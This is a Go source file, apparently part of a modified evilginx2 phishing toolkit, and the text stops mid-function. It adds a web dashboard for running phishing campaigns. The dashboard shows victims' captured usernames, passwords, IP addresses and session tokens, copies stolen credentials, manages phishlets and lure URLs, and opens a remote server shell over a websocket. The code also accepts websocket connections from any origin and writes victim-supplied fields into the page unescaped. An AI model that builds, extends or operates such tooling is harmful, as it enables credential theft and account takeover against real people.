package core

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebServer struct {
	server            *http.Server
	cfg               *Config
	db                *database.Database
	proxy             *HttpProxy
	upgrader          websocket.Upgrader
	clients           map[*websocket.Conn]bool
	clientsMutex      sync.RWMutex
	sessions          map[string]*AuthSession
	sessionsMutex     sync.RWMutex
	terminalSessions  map[string]*TerminalSession
	terminalMutex     sync.RWMutex
	commandFilter     *CommandFilter
	isRunning         bool
}

type AuthSession struct {
	Token     string
	CreatedAt time.Time
	ExpiresAt time.Time
	IPAddress string
}

type AuthRequest struct {
	Key string `json:"key"`
}

type AuthResponse struct {
	Success bool   `json:"success"`
	Token   string `json:"token,omitempty"`
	Message string `json:"message,omitempty"`
}

type AuthStatusResponse struct {
	IsSetup         bool `json:"is_setup"`
	IsLocked        bool `json:"is_locked"`
	IsAuthenticated bool `json:"is_authenticated"`
}

type SetupResponse struct {
	Success bool   `json:"success"`
	Key     string `json:"key,omitempty"`
	Message string `json:"message,omitempty"`
}

type DashboardData struct {
	Sessions      []*database.Session `json:"sessions"`
	ActiveSessions int                `json:"active_sessions"`
	TotalSessions  int                `json:"total_sessions"`
	ServerStats   *ServerStats       `json:"server_stats"`
	Phishlets     []PhishletInfo     `json:"phishlets"`
}

type ServerStats struct {
	Uptime       string `json:"uptime"`
	Domain       string `json:"domain"`
	IPAddress    string `json:"ip_address"`
	HTTPSPort    int    `json:"https_port"`
	DNSPort      int    `json:"dns_port"`
	TelegramEnabled bool `json:"telegram_enabled"`
}

type PhishletInfo struct {
	Name     string `json:"name"`
	Enabled  bool   `json:"enabled"`
	Hostname string `json:"hostname"`
	Visible  bool   `json:"visible"`
}

type WebSocketMessage struct {
	Type    string      `json:"type"`
	Data    interface{} `json:"data"`
	Time    time.Time   `json:"time"`
}

type TerminalSession struct {
	ID           string
	CMD          *exec.Cmd
	PTY          *os.File
	Conn         *websocket.Conn
	CreatedAt    time.Time
	LastActivity time.Time
	UserID       string
	IsActive     bool
	mutex        sync.RWMutex
}

type CommandFilter struct {
	blockedCommands []string
	blockedPaths    []string
}

var startTime = time.Now()

func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServer {
	ws := &WebServer{
		cfg:              cfg,
		db:               db,
		proxy:            proxy,
		clients:          make(map[*websocket.Conn]bool),
		sessions:         make(map[string]*AuthSession),
		terminalSessions: make(map[string]*TerminalSession),
		commandFilter:    NewCommandFilter(),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true // Allow all origins for development
			},
		},
	}

	router := mux.NewRouter()
	
	// Dashboard routes
	router.HandleFunc("/", ws.handleDashboard).Methods("GET")
	router.HandleFunc("/dashboard", ws.handleDashboard).Methods("GET")
	
	// API routes
	router.HandleFunc("/api/sessions", ws.handleAPISessions).Methods("GET")
	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
	router.HandleFunc("/api/phishlets/{name}/enable", ws.handleAPIPhishletEnable).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/disable", ws.handleAPIPhishletDisable).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/hostname", ws.handleAPIPhishletHostname).Methods("POST")
	router.HandleFunc("/api/phishlets/{name}/credentials", ws.handleAPIPhishletCredentials).Methods("GET")
	
	// Lures API routes
	router.HandleFunc("/api/lures", ws.handleAPILures).Methods("GET")
	router.HandleFunc("/api/lures", ws.handleAPICreateLure).Methods("POST")
	router.HandleFunc("/api/lures/{id}", ws.handleAPIUpdateLure).Methods("PUT")
	router.HandleFunc("/api/lures/{id}", ws.handleAPIDeleteLure).Methods("DELETE")
	router.HandleFunc("/api/lures/{id}/url", ws.handleAPILureGetURL).Methods("GET")
	
	// Authentication routes
	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
	router.HandleFunc("/api/auth/setup", ws.handleAuthSetup).Methods("POST")
	router.HandleFunc("/api/auth/login", ws.handleAuthLogin).Methods("POST")
	router.HandleFunc("/api/auth/logout", ws.handleAuthLogout).Methods("POST")
	router.HandleFunc("/api/auth/lock", ws.handleAuthLock).Methods("POST")
	router.HandleFunc("/api/auth/unlock", ws.handleAuthUnlock).Methods("POST")
	
	// WebSocket endpoint
	router.HandleFunc("/ws", ws.handleWebSocket).Methods("GET")
	
	// Terminal WebSocket endpoint
	router.HandleFunc("/ws/terminal", ws.handleTerminalWebSocket).Methods("GET")
	
	// Static file serving
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))

	ws.server = &http.Server{
		Addr:         fmt.Sprintf(":%d", cfg.GetWebPort()),
		Handler:      router,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	return ws
}

func (ws *WebServer) Start() error {
	if ws.isRunning {
		return fmt.Errorf("web server is already running")
	}

	go func() {
		log.Info("starting web dashboard on port %d", ws.cfg.GetWebPort())
		if err := ws.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("web server error: %v", err)
		}
	}()

	ws.isRunning = true
	return nil
}

func (ws *WebServer) Stop() error {
	if !ws.isRunning {
		return nil
	}

	ws.isRunning = false
	return ws.server.Close()
}

func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	dashboardHTML := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evilginx Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            line-height: 1.6;
        }

        /* Authentication Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }

        .modal.active {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            text-align: center;
        }

        .modal h2 {
            color: #4CAF50;
            margin-bottom: 20px;
            font-size: 24px;
        }

        .setup-steps {
            text-align: left;
        }

        .step {
            display: none;
            padding: 20px 0;
        }

        .step.active {
            display: block;
        }

        .key-display {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            color: #4CAF50;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .key-warning {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.5);
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            color: #ffc107;
            font-size: 14px;
        }

        .form-group {
            margin: 20px 0;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #e0e0e0;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.3);
            color: #e0e0e0;
            font-size: 16px;
        }

        .form-group input:focus {
            outline: none;
            border-color: #4CAF50;
        }

        .btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
            transition: all 0.3s ease;
        }

        .btn:hover {
            background: linear-gradient(45deg, #45a049, #3d8b40);
            transform: translateY(-2px);
        }

        .btn-secondary {
            background: linear-gradient(45deg, #666, #555);
        }

        .btn-secondary:hover {
            background: linear-gradient(45deg, #555, #444);
        }

        .error {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid rgba(244, 67, 54, 0.5);
            border-radius: 8px;
            padding: 10px;
            margin: 10px 0;
            color: #f44336;
            font-size: 14px;
        }

        .hidden {
            display: none;
        }

        .auth-controls {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 999;
        }

        .auth-controls .btn {
            margin: 5px;
            padding: 8px 16px;
            font-size: 14px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }

        .header p {
            color: #888;
            font-size: 1.1rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .stat-label {
            color: #888;
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .sessions-section {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 1.8rem;
            margin-bottom: 20px;
            color: #4ecdc4;
        }

        .sessions-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .sessions-table th,
        .sessions-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .sessions-table th {
            background: rgba(255, 255, 255, 0.1);
            color: #4ecdc4;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .sessions-table tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-captured {
            background: #4ecdc4;
            color: #0c0c0c;
        }

        .status-empty {
            background: #666;
            color: #fff;
        }

        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 0.9rem;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .connection-status.connected {
            background: #4ecdc4;
            color: #0c0c0c;
        }

        .connection-status.disconnected {
            background: #ff6b6b;
            color: #fff;
        }

        .loading {
            text-align: center;
            padding: 50px;
            color: #888;
        }

        .phishlets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .phishlet-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .phishlet-card:hover {
            border-color: rgba(255, 255, 255, 0.2);
        }

        .phishlet-name {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 10px;
            color: #4ecdc4;
        }

        .phishlet-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .phishlet-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .phishlet-actions .btn {
            padding: 8px 12px;
            font-size: 14px;
            flex: 1;
            min-width: 80px;
        }

        .auto-refresh {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 25px;
            padding: 10px 20px;
            color: #4ecdc4;
            font-size: 0.9rem;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .pulsing {
            animation: pulse 2s infinite;
        }

        /* Terminal Modal Styles */
        .terminal-modal {
            z-index: 1001;
        }

        .terminal-content {
            width: 90%;
            max-width: 1200px;
            height: 80vh;
            max-height: 600px;
            padding: 0;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            overflow: hidden;
        }

        .terminal-header {
            background: #2d2d2d;
            padding: 15px 20px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-header h2 {
            color: #4CAF50;
            margin: 0;
            font-size: 18px;
        }

        .terminal-controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .connection-status {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .connection-status.connected {
            background: #4CAF50;
            color: white;
        }

        .connection-status.disconnected {
            background: #f44336;
            color: white;
        }

        .connection-status.connecting {
            background: #ff9800;
            color: white;
        }

        .terminal-warning {
            background: #2d2d2d;
            color: #ff9800;
            padding: 10px 20px;
            border-bottom: 1px solid #333;
            font-size: 14px;
        }

        .terminal-container {
            height: calc(100% - 120px);
            background: #000;
            position: relative;
            overflow: hidden;
        }

        .terminal-container .xterm {
            height: 100%;
            width: 100%;
        }

        .terminal-container .xterm .xterm-viewport {
            overflow-y: auto;
        }

        .terminal-container .xterm .xterm-screen {
            background: #000;
        }

        .terminal-container .xterm .xterm-cursor {
            color: #fff;
            background: #fff;
        }

        .terminal-container .xterm .xterm-selection {
            background: rgba(255, 255, 255, 0.3);
        }
    </style>
</head>
<body>
    <!-- Authentication Modals -->
    <div id="setupWizard" class="modal">
        <div class="modal-content">
            <h2>🔐 Setup Web Panel Security</h2>
            <div class="setup-steps">
                <div class="step active" data-step="1">
                    <h3>Welcome</h3>
                    <p>Secure your web panel with a unique authentication key.</p>
                    <p>This key will be required to access the dashboard.</p>
                    <button class="btn" onclick="startSetup()">Get Started</button>
                </div>
                
                <div class="step" data-step="2">
                    <h3>🔑 Your Security Key</h3>
                    <p>Save this key in a secure location. You will need it to access the dashboard.</p>
                    <div class="key-display">
                        <code id="generatedKey"></code>
                        <button class="btn-secondary" onclick="copyKey()">📋 Copy</button>
                    </div>
                    <div class="key-warning">
                        ⚠️ <strong>Important:</strong> Save this key securely! It cannot be recovered if lost.
                    </div>
                    <button class="btn" onclick="confirmSetup()">I've Saved It</button>
                </div>
                
                <div class="step" data-step="3">
                    <h3>✅ Setup Complete</h3>
                    <p>Your web panel is now secured with authentication!</p>
                    <p>You can now access the dashboard and use the lock/unlock feature.</p>
                    <button class="btn" onclick="finishSetup()">Continue to Dashboard</button>
                </div>
            </div>
        </div>
    </div>

    <div id="loginModal" class="modal">
        <div class="modal-content">
            <h2>🔐 Enter Security Key</h2>
            <p>Please enter your security key to access the dashboard.</p>
            <form id="loginForm">
                <div class="form-group">
                    <label for="securityKey">Security Key:</label>
                    <input type="password" id="securityKey" placeholder="Enter your security key" required>
                </div>
                <button type="submit" class="btn">Unlock Dashboard</button>
            </form>
            <div id="loginError" class="error hidden"></div>
        </div>
    </div>

    <div id="unlockModal" class="modal">
        <div class="modal-content">
            <h2>🔓 Unlock Panel</h2>
            <p>The panel is currently locked. Enter your security key to unlock it.</p>
            <form id="unlockForm">
                <div class="form-group">
                    <label for="unlockKey">Security Key:</label>
                    <input type="password" id="unlockKey" placeholder="Enter your security key" required>
                </div>
                <button type="submit" class="btn">Unlock Panel</button>
            </form>
            <div id="unlockError" class="error hidden"></div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div id="terminalModal" class="modal terminal-modal">
        <div class="modal-content terminal-content">
            <div class="terminal-header">
                <h2>🖥️ VPS Terminal</h2>
                <div class="terminal-controls">
                    <span class="connection-status" id="terminalStatus">Disconnected</span>
                    <button class="btn btn-secondary" onclick="clearTerminal()">🧹 Clear</button>
                    <button class="btn btn-secondary" onclick="closeTerminal()">✖️ Close</button>
                </div>
            </div>
            <div class="terminal-warning">
                ⚠️ <strong>Security Notice:</strong> This terminal has command filtering enabled. Dangerous commands are automatically blocked for security.
            </div>
            <div class="terminal-container">
                <div id="terminal"></div>
            </div>
        </div>
    </div>

    <!-- Authentication Controls -->
    <div class="auth-controls" id="authControls" style="display: none;">
        <button class="btn btn-secondary" onclick="openTerminal()">🖥️ Terminal</button>
        <button class="btn btn-secondary" onclick="lockPanel()">🔒 Lock Panel</button>
        <button class="btn btn-secondary" onclick="logout()">🚪 Logout</button>
    </div>

    <div class="container">
        <div class="header">
            <h1>🎣 Evilginx Dashboard</h1>
            <p>Real-time monitoring and session management</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="total-sessions">0</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="active-sessions">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="captured-sessions">0</div>
                <div class="stat-label">Captured Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uptime">0h 0m</div>
                <div class="stat-label">Uptime</div>
            </div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">📊 Recent Sessions</h2>
            <div id="sessions-content" class="loading">Loading sessions...</div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">🎯 Phishlets</h2>
            <div id="phishlets-content" class="loading">Loading phishlets...</div>
        </div>

        <div class="sessions-section">
            <h2 class="section-title">🎣 Lures</h2>
            <div style="margin-bottom: 20px;">
                <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
            </div>
            <div id="lures-content" class="loading">Loading lures...</div>
        </div>
    </div>

    <div class="connection-status disconnected" id="connection-status">
        Disconnected
    </div>

    <div class="auto-refresh">
        🔄 Auto-refresh enabled
    </div>

    <script>
        // Authentication System
        class AuthManager {
            constructor() {
                this.token = localStorage.getItem('authToken');
                this.checkAuthStatus();
            }

            async checkAuthStatus() {
                try {
                    const response = await fetch('/api/auth/status', {
                        headers: { 'Authorization': this.token || '' }
                    });
                    const data = await response.json();
                    
                    if (!data.is_setup) {
                        this.showSetupWizard();
                    } else if (data.is_locked) {
                        this.showUnlockModal();
                    } else if (!data.is_authenticated) {
                        this.showLoginModal();
                    } else {
                        this.showDashboard();
                    }
                } catch (error) {
                    console.error('Auth status check failed:', error);
                    this.showLoginModal();
                }
            }

            showSetupWizard() {
                document.getElementById('setupWizard').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showLoginModal() {
                document.getElementById('loginModal').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showUnlockModal() {
                document.getElementById('unlockModal').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showDashboard() {
                document.querySelectorAll('.modal').forEach(modal => {
                    modal.classList.remove('active');
                });
                document.querySelector('.container').style.display = 'block';
                document.getElementById('authControls').style.display = 'block';
            }

            hideError(errorId) {
                const error = document.getElementById(errorId);
                if (error) error.classList.add('hidden');
            }

            showError(errorId, message) {
                const error = document.getElementById(errorId);
                if (error) {
                    error.textContent = message;
                    error.classList.remove('hidden');
                }
            }

            async login(key) {
                try {
                    const response = await fetch('/api/auth/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ key: key })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.token = data.token;
                        localStorage.setItem('authToken', this.token);
                        this.showDashboard();
                        if (window.dashboard) {
                            window.dashboard.init();
                        }
                    } else {
                        this.showError('loginError', data.message);
                    }
                } catch (error) {
                    this.showError('loginError', 'Login failed. Please try again.');
                }
            }

            async logout() {
                try {
                    await fetch('/api/auth/logout', {
                        method: 'POST',
                        headers: { 'Authorization': this.token }
                    });
                } catch (error) {
                    console.error('Logout failed:', error);
                }
                
                this.token = null;
                localStorage.removeItem('authToken');
                this.checkAuthStatus();
            }

            async lockPanel() {
                try {
                    const response = await fetch('/api/auth/lock', {
                        method: 'POST',
                        headers: { 'Authorization': this.token }
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.token = null;
                        localStorage.removeItem('authToken');
                        this.checkAuthStatus();
                    }
                } catch (error) {
                    console.error('Lock failed:', error);
                }
            }

            async unlockPanel(key) {
                try {
                    const response = await fetch('/api/auth/unlock', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ key: key })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.checkAuthStatus();
                    } else {
                        this.showError('unlockError', data.message);
                    }
                } catch (error) {
                    this.showError('unlockError', 'Unlock failed. Please try again.');
                }
            }

            async setupAuth() {
                try {
                    const response = await fetch('/api/auth/setup', {
                        method: 'POST'
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        document.getElementById('generatedKey').textContent = data.key;
                        this.showStep(2);
                    } else {
                        alert('Setup failed: ' + data.message);
                    }
                } catch (error) {
                    alert('Setup failed. Please try again.');
                }
            }

            showStep(step) {
                document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
                document.querySelector(`[data-step="${step}"]`).classList.add('active');
            }

            copyKey() {
                const key = document.getElementById('generatedKey').textContent;
                navigator.clipboard.writeText(key).then(() => {
                    alert('Key copied to clipboard!');
                });
            }
        }

        // Global functions for HTML onclick handlers
        let authManager;
        
        function startSetup() {
            authManager.setupAuth();
        }

        function confirmSetup() {
            authManager.showStep(3);
        }

        function finishSetup() {
            authManager.showLoginModal();
        }

        function copyKey() {
            authManager.copyKey();
        }

        function lockPanel() {
            if (confirm('Are you sure you want to lock the panel?')) {
                authManager.lockPanel();
            }
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                authManager.logout();
            }
        }

        // Form handlers
        document.addEventListener('DOMContentLoaded', function() {
            authManager = new AuthManager();

            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                authManager.hideError('loginError');
                const key = document.getElementById('securityKey').value;
                authManager.login(key);
            });

            document.getElementById('unlockForm').addEventListener('submit', function(e) {
                e.preventDefault();
                authManager.hideError('unlockError');
                const key = document.getElementById('unlockKey').value;
                authManager.unlockPanel(key);
            });
        });

        class EvilginxDashboard {
            constructor() {
                this.ws = null;
                this.reconnectInterval = null;
                this.init();
            }

            init() {
                this.connectWebSocket();
                this.loadInitialData();
                
                // Auto-refresh every 5 seconds if WebSocket is not connected
                setInterval(() => {
                    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
                        this.loadInitialData();
                    }
                }, 5000);
            }

            connectWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = ` + "`" + `${protocol}//${window.location.host}/ws` + "`" + `;
                
                this.ws = new WebSocket(wsUrl);
                
                this.ws.onopen = () => {
                    console.log('WebSocket connected');
                    this.updateConnectionStatus(true);
                    if (this.reconnectInterval) {
                        clearInterval(this.reconnectInterval);
                        this.reconnectInterval = null;
                    }
                };

                this.ws.onmessage = (event) => {
                    const message = JSON.parse(event.data);
                    this.handleWebSocketMessage(message);
                };

                this.ws.onclose = () => {
                    console.log('WebSocket disconnected');
                    this.updateConnectionStatus(false);
                    this.scheduleReconnect();
                };

                this.ws.onerror = (error) => {
                    console.error('WebSocket error:', error);
                    this.updateConnectionStatus(false);
                };
            }

            scheduleReconnect() {
                if (this.reconnectInterval) return;
                
                this.reconnectInterval = setInterval(() => {
                    console.log('Attempting to reconnect...');
                    this.connectWebSocket();
                }, 3000);
            }

            handleWebSocketMessage(message) {
                switch (message.type) {
                    case 'session_update':
                        this.updateSessionsTable(message.data);
                        break;
                    case 'stats_update':
                        this.updateStats(message.data);
                        break;
                    case 'new_session':
                        this.addNewSession(message.data);
                        break;
                }
            }

            updateConnectionStatus(connected) {
                const statusEl = document.getElementById('connection-status');
                if (connected) {
                    statusEl.className = 'connection-status connected';
                    statusEl.textContent = 'Connected';
                } else {
                    statusEl.className = 'connection-status disconnected';
                    statusEl.textContent = 'Disconnected';
                }
            }

            async loadInitialData() {
                try {
                    const [sessionsData, statsData, phishletsData, luresData] = await Promise.all([
                        fetch('/api/sessions').then(r => r.json()),
                        fetch('/api/stats').then(r => r.json()),
                        fetch('/api/phishlets').then(r => r.json()),
                        fetch('/api/lures', { headers: { 'Authorization': authManager.token } }).then(r => r.json())
                    ]);

                    this.updateSessionsTable(sessionsData);
                    this.updateStats(statsData);
                    this.updatePhishlets(phishletsData);
                    this.updateLures(luresData);
                } catch (error) {
                    console.error('Error loading initial data:', error);
                }
            }

            updateStats(stats) {
                document.getElementById('total-sessions').textContent = stats.total_sessions || 0;
                document.getElementById('active-sessions').textContent = stats.active_sessions || 0;
                document.getElementById('captured-sessions').textContent = stats.captured_sessions || 0;
                document.getElementById('uptime').textContent = stats.uptime || '0h 0m';
            }

            updateSessionsTable(sessions) {
                const contentEl = document.getElementById('sessions-content');
                
                if (!sessions || sessions.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No sessions found</p>';
                    return;
                }

                const tableHTML = ` + "`" + `
                    <table class="sessions-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Phishlet</th>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Status</th>
                                <th>IP Address</th>
                                <th>Time</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${sessions.map(session => ` + "`" + `
                                <tr>
                                    <td>${session.id}</td>
                                    <td><strong>${session.phishlet}</strong></td>
                                    <td>${session.username || '-'}</td>
                                    <td>${session.password ? '••••••••' : '-'}</td>
                                    <td>
                                        <span class="status-badge ${this.getSessionStatus(session)}">
                                            ${this.getSessionStatusText(session)}
                                        </span>
                                    </td>
                                    <td>${session.remote_addr}</td>
                                    <td>${new Date(session.update_time * 1000).toLocaleString()}</td>
                                    <td>
                                        ${session.username && session.password ? 
                                            `<button class="btn btn-secondary" onclick="copySessionCredentials('${session.username}', '${session.password}')">📋 Copy</button>` : 
                                            '-'
                                        }
                                    </td>
                                </tr>
                            ` + "`" + `).join('')}
                        </tbody>
                    </table>
                ` + "`" + `;

                contentEl.innerHTML = tableHTML;
            }

            updatePhishlets(phishlets) {
                const contentEl = document.getElementById('phishlets-content');
                
                if (!phishlets || phishlets.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No phishlets found</p>';
                    return;
                }

                const phishletsHTML = ` + "`" + `
                    <div class="phishlets-grid">
                        ${phishlets.map(phishlet => ` + "`" + `
                            <div class="phishlet-card">
                                <div class="phishlet-name">${phishlet.name}</div>
                                <div class="phishlet-status">
                                    <span>Status:</span>
                                    <span class="status-badge ${phishlet.enabled ? 'status-captured' : 'status-empty'}">
                                        ${phishlet.enabled ? 'Enabled' : 'Disabled'}
                                    </span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Hostname:</span>
                                    <span>${phishlet.hostname || 'Not set'}</span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Visible:</span>
                                    <span>${phishlet.visible ? 'Yes' : 'No'}</span>
                                </div>
                                <div class="phishlet-actions">
                                    <button class="btn ${phishlet.enabled ? 'btn-secondary' : 'btn-primary'}" 
                                            onclick="togglePhishlet('${phishlet.name}', ${phishlet.enabled})">
                                        ${phishlet.enabled ? '🔴 Disable' : '🟢 Enable'}
                                    </button>
                                    <button class="btn btn-secondary" onclick="copyCredentials('${phishlet.name}')">📋 Copy</button>
                                    <button class="btn btn-secondary" onclick="setPhishletHostname('${phishlet.name}')">🏠 Set Hostname</button>
                                </div>
                            </div>
                        ` + "`" + `).join('')}
                    </div>
                ` + "`" + `;

                contentEl.innerHTML = phishletsHTML;
            }

            updateLures(lures) {
                const contentEl = document.getElementById('lures-content');
                
                if (!lures || lures.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No lures found</p>';
                    return;
                }

                const luresHTML = ` + "`" + `
                    <div class="phishlets-grid">
                        ${lures.map((lure, index) => ` + "`" + `
                            <div class="phishlet-card">
                                <div class="phishlet-name">Lure #${index}</div>
                                <div class="phishlet-status">
                                    <span>Phishlet:</span>
                                    <span>${lure.phishlet}</span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Path:</span>
                                    <span>${lure.path}</span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Hostname:</span>
                                    <span>${lure.hostname || 'Default'}</span>
                                </div>
                                <div class="phishlet-status">
                                    <span>Redirect URL:</span>
                                    <span>${lure.redirect_url || 'None'}</span>
                                </div>
                                <div class="phishlet-actions">
                                    <button class="btn btn-primary" onclick="getLureURL(${index})">🔗 Get URL</button>
                                    <button class="btn btn-secondary" onclick="editLure(${index})">✏️ Edit</button>
                                    <button class="btn btn-secondary" onclick="deleteLure(${index})">🗑️ Delete</button>
                                </div>
                            </div>
                        ` + "`" + `).join('')}
                    </div>
                ` + "`" + `;

                contentEl.innerHTML = luresHTML;
            }

            getSessionStatus(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
                    return 'status-captured';
                }
                return 'status-empty';
            }

            getSessionStatusText(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
